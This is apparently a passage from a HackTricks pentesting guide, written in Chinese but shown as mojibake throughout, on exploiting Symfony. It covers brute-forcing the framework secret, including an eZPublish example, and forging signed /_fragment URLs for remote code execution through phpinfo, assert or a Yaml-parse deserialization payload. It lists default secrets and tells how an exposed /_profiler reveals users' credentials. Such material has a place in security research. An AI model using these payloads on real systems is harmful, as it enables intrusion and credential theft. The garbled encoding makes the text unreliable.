ç”±äºç§˜å¯†é€šå¸¸æ˜¯æ‰‹åŠ¨è®¾ç½®çš„ï¼ˆè€Œä¸æ˜¯éšæœºç”Ÿæˆçš„ï¼‰ï¼Œäººä»¬é€šå¸¸ä¼šä½¿ç”¨å¯†ç çŸ­è¯­è€Œä¸æ˜¯å®‰å…¨çš„éšæœºå€¼ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å“ˆå¸Œæ¥è¿›è¡Œæš´åŠ›ç ´è§£ã€‚æ˜¾ç„¶ï¼Œä¸€ä¸ªæœ‰æ•ˆçš„`/_fragment` URLï¼ˆä¾‹å¦‚Symfonyç”Ÿæˆçš„URLï¼‰å°†ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„æ¶ˆæ¯-å“ˆå¸Œå¯¹ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥å¯¹ç§˜å¯†è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

_å“åº”ä¸­åŒ…å«äº†ä¸€ä¸ªæœ‰æ•ˆçš„fragmentè¯·æ±‚_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

åœ¨æœ¬æ–‡çš„å¼€å¤´ï¼Œæˆ‘ä»¬è¯´Symfonyçš„ç§˜å¯†æœ‰å‡ ä¸ªç”¨é€”ã€‚å…¶ä¸­ä¹‹ä¸€å°±æ˜¯ç”¨äºç”ŸæˆCSRFä»¤ç‰Œã€‚`secret`çš„å¦ä¸€ä¸ªç”¨é€”æ˜¯ç”¨äºç­¾åè®°ä½æˆ‘ï¼ˆremember-meï¼‰cookieã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è‡ªå·±çš„CSRFä»¤ç‰Œæˆ–è®°ä½æˆ‘cookieæ¥æš´åŠ›ç ´è§£`secret`çš„å€¼ã€‚

_æ„é€ è¿™äº›ä»¤ç‰Œçš„é€†å‘å·¥ç¨‹ç•™ç»™è¯»è€…ä½œä¸ºç»ƒä¹ ã€‚_

### æ›´è¿›ä¸€æ­¥ï¼šeZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

ä¸ºäº†æ¼”ç¤ºå¦‚ä½•é€šè¿‡æš´åŠ›ç ´è§£ç§˜å¯†æ¥å®ç°ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬å°†çœ‹çœ‹å¦‚ä½•æ‰¾å‡ºeZPublish 2014.07çš„ç§˜å¯†ã€‚

#### å¯»æ‰¾æš´åŠ›ç ´è§£ææ–™ <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublishç”Ÿæˆå…¶CSRFä»¤ç‰Œçš„æ–¹å¼å¦‚ä¸‹ï¼š
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
è¦æ„å»ºè¿™ä¸ªä»¤ç‰Œï¼ŒeZPä½¿ç”¨äº†æˆ‘ä»¬çŸ¥é“çš„ä¸¤ä¸ªå€¼å’Œç§˜å¯†ï¼š`getIntention()`æ˜¯ç”¨æˆ·å°è¯•çš„æ“ä½œï¼ˆä¾‹å¦‚`authenticate`ï¼‰ï¼Œ`session_id()`æ˜¯PHPä¼šè¯IDï¼Œè€Œ`getSecret()`åˆ™æ˜¯Symfonyçš„`secret`ã€‚

ç”±äºCSRFä»¤ç‰Œå¯ä»¥åœ¨æŸäº›è¡¨å•ä¸­æ‰¾åˆ°ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰äº†ç ´è§£ç§˜å¯†çš„ææ–™ã€‚

ä¸å¹¸çš„æ˜¯ï¼ŒezPublishé›†æˆäº†æ¥è‡ªsensiolabsçš„ä¸€ä¸ªbundleï¼Œ[sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle)ã€‚è¯¥è½¯ä»¶åŒ…ç¡®ä¿ç§˜å¯†å¯†é’¥æ˜¯éšæœºçš„ã€‚å®ƒåœ¨å®‰è£…æ—¶ç”Ÿæˆå¦‚ä¸‹ï¼š
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
è¿™ä¸ªçœ‹èµ·æ¥å¾ˆéš¾æš´åŠ›ç ´è§£ï¼š`mt_rand()`å¯ä»¥äº§ç”Ÿ231ä¸ªä¸åŒçš„å€¼ï¼Œè€Œ`uniqid()`æ˜¯ç”±å½“å‰æ—¶é—´æˆ³ï¼ˆå¸¦æœ‰å¾®ç§’ï¼‰æ„å»ºçš„ã€‚
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### æ­ç¤ºæ—¶é—´æˆ³ <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªç§˜å¯†æ˜¯åœ¨å®‰è£…çš„æœ€åä¸€æ­¥ç”Ÿæˆçš„ï¼Œåœ¨ç½‘ç«™è®¾ç½®å®Œæˆåç«‹å³ç”Ÿæˆã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯èƒ½ä¼šæ³„éœ²ç”¨äºç”Ÿæˆæ­¤å“ˆå¸Œçš„æ—¶é—´æˆ³ã€‚

ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æ—¥å¿—ï¼ˆä¾‹å¦‚`/var/log/storage.log`ï¼‰ï¼›å¯ä»¥æ³„éœ²ç¼“å­˜æ¡ç›®åˆ›å»ºçš„ç¬¬ä¸€æ¬¡æ—¶é—´ã€‚ç¼“å­˜æ¡ç›®åœ¨è°ƒç”¨`generateRandomSecret()`ä¹‹åç«‹å³åˆ›å»ºã€‚

_ç¤ºä¾‹æ—¥å¿—å†…å®¹ï¼šæ—¶é—´æˆ³ä¸è®¡ç®—å¯†é’¥æ—¶ä½¿ç”¨çš„æ—¶é—´æˆ³ç±»ä¼¼_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

å¦‚æœæ—¥å¿—ä¸å¯ç”¨ï¼Œå¯ä»¥ä½¿ç”¨eZPublishçš„å¼ºå¤§æœç´¢å¼•æ“æ¥æŸ¥æ‰¾ç½‘ç«™çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åˆ›å»ºæ—¶é—´ã€‚å®é™…ä¸Šï¼Œå½“ç½‘ç«™åˆ›å»ºæ—¶ï¼Œä¼šå°†è®¸å¤šæ—¶é—´æˆ³æ”¾å…¥æ•°æ®åº“ä¸­ã€‚è¿™æ„å‘³ç€eZPublishç½‘ç«™çš„åˆå§‹æ•°æ®çš„æ—¶é—´æˆ³ä¸ç”¨äºè®¡ç®—`uniqid()`çš„æ—¶é—´æˆ³ç›¸åŒã€‚æˆ‘ä»¬å¯ä»¥æœç´¢`landing_page` _ContentObject_å¹¶æ‰¾å‡ºå…¶æ—¶é—´æˆ³ã€‚

## æš´åŠ›ç ´è§£ç¼ºå¤±çš„éƒ¨åˆ† <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

æˆ‘ä»¬ç°åœ¨çŸ¥é“ç”¨äºè®¡ç®—å¯†é’¥çš„æ—¶é—´æˆ³ï¼Œä»¥åŠä»¥ä¸‹å½¢å¼çš„å“ˆå¸Œå€¼ï¼š
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†æ€»å…±231 * 106ç§å¯èƒ½æ€§ã€‚ä½¿ç”¨[hashcat](https://hashcat.net)å’Œä¸€ç»„å¼ºå¤§çš„GPUï¼Œè¿™ä¸ªä»»åŠ¡æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯hashcatæ²¡æœ‰æä¾›`sha1(sha1($pass).$salt)`çš„å†…æ ¸ã€‚å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬å·²ç»å®ç°äº†ï¼ä½ å¯ä»¥åœ¨[è¿™é‡Œæ‰¾åˆ°æ‹‰å–è¯·æ±‚](https://github.com/hashcat/hashcat/pull/2536)ã€‚

ä½¿ç”¨æˆ‘ä»¬çš„ç ´è§£æœºå™¨ï¼Œæ‹¥æœ‰8ä¸ªGPUï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸åˆ°20å°æ—¶å†…ç ´è§£è¿™ä¸ªå“ˆå¸Œã€‚

åœ¨è·å–å“ˆå¸Œä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`/_fragment`æ¥æ‰§è¡Œä»£ç ã€‚

## ç»“è®º <a href="#conclusion" id="conclusion"></a>

Symfonyç°åœ¨æ˜¯è®¸å¤šPHPåº”ç”¨ç¨‹åºçš„æ ¸å¿ƒç»„ä»¶ã€‚å› æ­¤ï¼Œä»»ä½•å½±å“è¯¥æ¡†æ¶çš„å®‰å…¨é£é™©éƒ½ä¼šå½±å“åˆ°è®¸å¤šç½‘ç«™ã€‚æ­£å¦‚æœ¬æ–‡æ‰€ç¤ºï¼Œæ— è®ºæ˜¯å¼±å¯†é’¥è¿˜æ˜¯è¾ƒä¸é‡è¦çš„æ¼æ´ï¼Œéƒ½å…è®¸æ”»å‡»è€…è·å¾—**è¿œç¨‹ä»£ç æ‰§è¡Œ**çš„æƒé™ã€‚

ä½œä¸ºè“é˜Ÿæˆå‘˜ï¼Œæ‚¨åº”è¯¥æ£€æŸ¥æ¯ä¸ªä¾èµ–Symfonyçš„ç½‘ç«™ã€‚æœ€æ–°çš„è½¯ä»¶ä¹Ÿä¸èƒ½æ’é™¤å­˜åœ¨æ¼æ´çš„å¯èƒ½æ€§ï¼Œå› ä¸ºå¯†é’¥æ˜¯åœ¨äº§å“é¦–æ¬¡å®‰è£…æ—¶ç”Ÿæˆçš„ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å‡ å¹´å‰åˆ›å»ºäº†ä¸€ä¸ªåŸºäºSymfony-3.xçš„ç½‘ç«™ï¼Œå¹¶åœ¨æ­¤è¿‡ç¨‹ä¸­ä¿æŒäº†æ›´æ–°ï¼Œé‚£ä¹ˆé»˜è®¤å¯†é’¥å¯èƒ½ä»ç„¶æœ‰æ•ˆã€‚

## æ”»å‡» <a href="#exploitation" id="exploitation"></a>

### ç†è®º <a href="#theory" id="theory"></a>

é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨åˆ©ç”¨æ­¤æ¼æ´æ—¶éœ€è¦å…³æ³¨ä»¥ä¸‹å‡ ç‚¹ï¼š

* HMACæ˜¯ä½¿ç”¨**å®Œæ•´çš„URL**è®¡ç®—çš„ã€‚å¦‚æœç½‘ç«™ä½äºåå‘ä»£ç†åé¢ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æœåŠ¡çš„å†…éƒ¨URLè€Œä¸æ˜¯æˆ‘ä»¬å‘é€æœ‰æ•ˆè½½è·çš„URLã€‚ä¾‹å¦‚ï¼Œå†…éƒ¨URLå¯èƒ½æ˜¯HTTPè€Œä¸æ˜¯HTTPSã€‚
* HMACçš„ç®—æ³•éšç€æ—¶é—´çš„æ¨ç§»è€Œæ”¹å˜ï¼šä¹‹å‰æ˜¯**SHA-1**ï¼Œç°åœ¨æ˜¯**SHA-256**ã€‚
* ç”±äºSymfonyä¼šä»è¯·æ±‚ä¸­åˆ é™¤`_hash`å‚æ•°ï¼Œç„¶åå†æ¬¡ç”ŸæˆURLï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸å…¶ç›¸åŒçš„URLä¸Šè®¡ç®—å“ˆå¸Œã€‚
* å¯ä»¥ä½¿ç”¨è®¸å¤šå¯†é’¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ£€æŸ¥å®ƒä»¬å…¨éƒ¨ã€‚
* åœ¨æŸäº›PHPç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬æ— æ³•è°ƒç”¨å…·æœ‰â€œæŒ‰å¼•ç”¨â€å‚æ•°çš„å‡½æ•°ï¼Œä¾‹å¦‚`system($command, &$return_value)`ã€‚
* åœ¨æŸäº›Symfonyç‰ˆæœ¬ä¸­ï¼Œ`_controller`ä¸èƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªæ–¹æ³•ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå…è®¸æˆ‘ä»¬æ‰§è¡Œä»£ç çš„Symfonyæ–¹æ³•ã€‚

å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹å‡ ç‚¹ï¼š

* åœ¨æ²¡æœ‰å‚æ•°æˆ–å…·æœ‰æ— æ•ˆå“ˆå¸Œçš„æƒ…å†µä¸‹è®¿é—®`/_fragment`åº”è¿”å›`403`ã€‚
* åœ¨å…·æœ‰æœ‰æ•ˆå“ˆå¸Œä½†æ²¡æœ‰æœ‰æ•ˆæ§åˆ¶å™¨çš„æƒ…å†µä¸‹è®¿é—®`/_fragment`åº”è¿”å›`500`ã€‚

æœ€åä¸€ç‚¹å…è®¸æˆ‘ä»¬æµ‹è¯•å¯†é’¥å€¼ï¼Œè€Œä¸å¿…æ‹…å¿ƒä¹‹åè¦è°ƒç”¨å“ªä¸ªå‡½æ•°æˆ–æ–¹æ³•ã€‚

### å®è·µ <a href="#practice" id="practice"></a>

å‡è®¾æˆ‘ä»¬æ­£åœ¨æ”»å‡»`https://target.com/_fragment`ã€‚ä¸ºäº†èƒ½å¤Ÿæ­£ç¡®ç­¾åURLï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä»¥ä¸‹ä¿¡æ¯ï¼š

* å†…éƒ¨URLï¼šå¯èƒ½æ˜¯`https://target.com/_fragment`ï¼Œä¹Ÿå¯èƒ½æ˜¯`http://target.com/_fragment`ï¼Œæˆ–è€…å®Œå…¨ä¸åŒçš„å†…å®¹ï¼ˆä¾‹å¦‚`http://target.website.internal`ï¼‰ï¼Œæˆ‘ä»¬æ— æ³•çŒœæµ‹
* å¯†é’¥ï¼šæˆ‘ä»¬æœ‰ä¸€ç»„å¸¸ç”¨çš„å¯†é’¥ï¼Œä¾‹å¦‚`ThisTokenIsNotSoSecretChangeIt`ï¼Œ`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`ç­‰ã€‚
* ç®—æ³•ï¼šSHA1æˆ–SHA256

æˆ‘ä»¬ç°åœ¨ä¸éœ€è¦æ‹…å¿ƒæœ‰æ•ˆè½½è·ï¼ˆ`_path`çš„å†…å®¹ï¼‰ï¼Œå› ä¸ºæ­£ç¡®ç­¾åçš„URLä¸ä¼šå¯¼è‡´æŠ›å‡º`AccessDeniedHttpException`ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå¯¼è‡´`403`ã€‚å› æ­¤ï¼Œè¯¥æ”»å‡»å°†å°è¯•æ¯ä¸ªï¼ˆç®—æ³•ã€URLã€å¯†é’¥ï¼‰ç»„åˆï¼Œç”Ÿæˆä¸€ä¸ªURLï¼Œå¹¶æ£€æŸ¥æ˜¯å¦ä¸è¿”å›`403`çŠ¶æ€ç ã€‚

_æ²¡æœ‰`_path`å‚æ•°çš„æœ‰æ•ˆè¯·æ±‚åˆ°`/_fragment`_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç­¾åä»»ä½•`/_fragment` URLï¼Œè¿™æ„å‘³ç€å®ƒæ˜¯ä¸€ä¸ªä¿è¯çš„RCEã€‚åªæ˜¯è¦è°ƒç”¨ä»€ä¹ˆå‡½æ•°çš„é—®é¢˜ã€‚

ç„¶åï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºæ˜¯å¦å¯ä»¥ç›´æ¥è°ƒç”¨å‡½æ•°ï¼Œè¿˜æ˜¯éœ€è¦ä½¿ç”¨ç±»æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥é¦–å…ˆå°è¯•æœ€ç®€å•ç›´æ¥çš„æ–¹å¼ï¼Œä½¿ç”¨è¯¸å¦‚`phpinfo ([ int $what = INFO_ALL ] )`ï¼ˆ[æ–‡æ¡£](https://www.php.net/manual/en/function.phpinfo.php)ï¼‰è¿™æ ·çš„å‡½æ•°ã€‚`_path` GETå‚æ•°å°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```
_controller=phpinfo
&what=-1
```
è€ŒURLå°†å¦‚ä¸‹æ‰€ç¤ºï¼š

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

å¦‚æœHTTPå“åº”æ˜¾ç¤ºäº†`phpinfo()`é¡µé¢ï¼Œæˆ‘ä»¬å°±æˆåŠŸäº†ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨å¦ä¸€ä¸ªå‡½æ•°ï¼Œæ¯”å¦‚`assert`ï¼š

_ä½¿ç”¨`_controller=assert`çš„ç¤ºä¾‹è¾“å‡º_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

å¦åˆ™ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ªç±»æ–¹æ³•ã€‚ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©æ˜¯`Symfony\Component\Yaml\Inline::parse`ï¼Œå®ƒæ˜¯ä¸€ä¸ªå†…ç½®çš„Symfonyç±»ï¼Œå› æ­¤åœ¨Symfonyç½‘ç«™ä¸Šæ˜¯å­˜åœ¨çš„ã€‚

æ˜¾ç„¶ï¼Œè¿™ä¸ªæ–¹æ³•è§£æä¸€ä¸ªYAMLè¾“å…¥å­—ç¬¦ä¸²ã€‚Symfonyçš„[YAML](https://yaml.org)è§£æå™¨æ”¯æŒ`php/object`æ ‡ç­¾ï¼Œå®ƒå°†æŠŠä¸€ä¸ªåºåˆ—åŒ–çš„è¾“å…¥å­—ç¬¦ä¸²è½¬æ¢ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä½¿ç”¨`unserialize()`å‡½æ•°ã€‚è¿™è®©æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬å–œæ¬¢çš„PHPå·¥å…·ï¼Œ[PHPGGC](https://github.com/ambionics/phpggc)ï¼

è¿™ä¸ªæ–¹æ³•çš„åŸå‹åœ¨å¤šå¹´é—´å‘ç”Ÿäº†å˜åŒ–ã€‚ä¾‹å¦‚ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªä¸åŒçš„åŸå‹ï¼š
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
ç›¸æ¯”äºä¸ºæ¯ä¸ªå‚æ•°æ„å»º`_path`ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·ä¸€ä¸ªäº‹å®ï¼šå¦‚æœæˆ‘ä»¬æä¾›çš„å‚æ•°åç§°ä¸æ–¹æ³•åŸå‹ä¸åŒ¹é…ï¼Œå®ƒå°†è¢«å¿½ç•¥ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰å¯èƒ½çš„å‚æ•°æ·»åŠ åˆ°æ–¹æ³•ä¸­ï¼Œè€Œä¸å¿…æ‹…å¿ƒå®é™…çš„åŸå‹ã€‚

å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ„å»º`_path`ï¼š
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
å†æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨`phpinfo()`ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰æ•ˆã€‚å¦‚æœæœ‰æ•ˆï¼Œæˆ‘ä»¬å¯ä»¥æ”¹ç”¨`system()`ã€‚

_ä½¿ç”¨åºåˆ—åŒ–è´Ÿè½½çš„`Inline::parse`çš„ç¤ºä¾‹è¾“å‡º_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

å› æ­¤ï¼Œåˆ©ç”¨ç¨‹åºå°†éå†æ¯ç§å¯èƒ½çš„å˜é‡ç»„åˆï¼Œç„¶åå°è¯•è¿™ä¸¤ç§åˆ©ç”¨æ–¹æ³•ã€‚ä»£ç å¯åœ¨[æˆ‘ä»¬çš„GitHub](https://github.com/ambionics/symfony-exploits)ä¸Šæ‰¾åˆ°ã€‚

## è®¿é—®symfony /\_profilerä¿¡æ¯

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

å¦‚ä¸Šé¢çš„å±å¹•æˆªå›¾æ‰€ç¤ºï¼Œé¡µé¢å³ä¸‹è§’æœ‰ä¸€ä¸ª`sf`æ ‡å¿—ã€‚å½“Symfonyå¤„äºè°ƒè¯•æ¨¡å¼ä¸‹æ—¶ï¼Œä¼šæ˜¾ç¤ºæ­¤æ ‡å¿—ã€‚æœ‰äº›æƒ…å†µä¸‹ï¼Œæ­¤æ ‡å¿—å¯èƒ½ä¸ä¼šæ˜¾ç¤ºï¼Œå› æ­¤å°è¯•è®¿é—®`/_profiler`ï¼Œæ‚¨å°†çœ‹åˆ°å¦‚ä¸‹æ‰€ç¤ºçš„é¡µé¢ã€‚

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

æ­¤åŠŸèƒ½ç§°ä¸ºSymfony Profilerï¼Œåœ¨äº’è”ç½‘ä¸Šå…³äºæ­¤åŠŸèƒ½çš„ä¿¡æ¯ä¸å¤šã€‚æ­¤åŠŸèƒ½çš„æ„å›¾éå¸¸æ˜ç¡®ï¼šåœ¨å‡ºç°é”™è¯¯æˆ–æ¼æ´æ—¶ï¼Œå®ƒå¯ä»¥å¸®åŠ©æ‚¨è¿›è¡Œè°ƒè¯•ã€‚å½“ç„¶ï¼Œåªæœ‰åœ¨å¯ç”¨è°ƒè¯•æ¨¡å¼æ—¶æ‰èƒ½ä½¿ç”¨æ­¤åŠŸèƒ½ã€‚

Symfonyæ¡†æ¶æœ¬èº«éå¸¸å®‰å…¨ï¼Œä½†å¯ç”¨è°ƒè¯•æ¨¡å¼å°†ä½¿è¯¥æ¡†æ¶ææ˜“å—æ”»å‡»ã€‚ä¾‹å¦‚ï¼ŒProfilerå…·æœ‰ä¸€ä¸ªåä¸ºProfile Searchçš„åŠŸèƒ½ï¼Œå¦‚ä¸‹é¢çš„å±å¹•æˆªå›¾æ‰€ç¤ºã€‚

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

å¦‚ä¸Šé¢çš„å±å¹•æˆªå›¾æ‰€ç¤ºï¼Œæ‚¨å¯ä»¥è®¿é—®å‘é€åˆ°æœåŠ¡å™¨çš„æ‰€æœ‰è¯·æ±‚ã€‚é€šè¿‡ç‚¹å‡»ä»¤ç‰Œä¸­çš„å“ˆå¸Œå€¼ï¼Œæ‚¨å°†çœ‹åˆ°å¯ä»¥è¯»å–æ‰€æœ‰POSTå‚æ•°ï¼Œå¦‚ä¸‹é¢çš„å±å¹•æˆªå›¾æ‰€ç¤ºã€‚åˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒç®¡ç†å‘˜å’Œç”¨æˆ·çš„å¸æˆ·å‡­æ®ã€‚

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### å…¶ä»–å¯ç”¨è°ƒè¯•çš„ç«¯ç‚¹

æ‚¨è¿˜åº”æ£€æŸ¥ä»¥ä¸‹URLï¼š

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## å‚è€ƒèµ„æ–™

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
